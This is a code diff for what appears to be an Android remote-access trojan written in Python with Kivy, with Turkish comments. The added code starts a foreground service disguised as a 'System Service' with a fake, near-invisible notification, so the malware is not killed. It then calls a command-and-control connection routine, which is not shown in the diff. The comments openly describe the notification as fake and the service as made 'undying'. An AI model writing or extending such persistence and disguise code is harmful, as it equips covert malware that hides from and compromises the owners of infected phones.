@@ -192,6 +192,63 @@ def connect_to_c2():
         
         time.sleep(10) # Bağlantı koparsa 10sn bekle
 
+# --- ANDROID FOREGROUND SERVICE (CRITICAL FOR API 31+) ---
+def start_foreground():
+    # Android servisi başlatıldığında 5 saniye içinde bildirim göstermezse çöker.
+    # Bu fonksiyon sahte bir bildirim oluşturur.
+    try:
+        from jnius import autoclass, cast
+        from android import api_version
+        
+        # Sadece Android ortamında çalıştır
+        PythonService = autoclass('org.kivy.android.PythonService')
+        service = PythonService.mService
+        Context = autoclass('android.content.Context')
+        NotificationBuilder = autoclass('android.app.Notification$Builder')
+        NotificationChannel = autoclass('android.app.NotificationChannel')
+        NotificationManager = autoclass('android.app.NotificationManager')
+        Color = autoclass('android.graphics.Color')
+        
+        # Kanal ID'si
+        channel_id = "elchapo_service_channel"
+        
+        # Android 8.0+ (Oreo) için Kanal Oluştur
+        if api_version >= 26:
+            full_service_name = service.getApplicationContext().getPackageName()
+            notification_channel = NotificationChannel(
+                channel_id, 
+                "System Service", # Kullanıcının göreceği isim
+                NotificationManager.IMPORTANCE_LOW # Sessiz bildirim
+            )
+            notification_channel.setDescription("Background service active")
+            notification_channel.enableLights(False)
+            notification_channel.enableVibration(False)
+            
+            notification_service = service.getSystemService(Context.NOTIFICATION_SERVICE)
+            notification_service.createNotificationChannel(notification_channel)
+            
+        # Bildirimi Oluştur
+        if api_version >= 26:
+            builder = NotificationBuilder(service, channel_id)
+        else:
+            builder = NotificationBuilder(service)
+            
+        builder.setContentTitle(service.getApplicationContext().getPackageName()) # Uygulama adı
+        builder.setContentText(".")
+        builder.setSmallIcon(service.getApplicationContext().getApplicationInfo().icon)
+        builder.setPriority(NotificationBuilder.PRIORITY_MIN) # Rahatsız etme
+        
+        notification = builder.build()
+        
+        # Servisi Foreground Moda Al (Çökmemesi için ŞART)
+        service.startForeground(101, notification)
+        
+    except Exception as e:
+        pass # Windows'ta hata vermesin diye pass
+
 if __name__ == '__main__':
-    # Servis başladığında çalışacak ana kod
+    # 1. Önce Servisi "Ölmez" Moda Al
+    start_foreground()
+    
+    # 2. Sonra C2 Bağlantısını Başlat
     connect_to_c2()
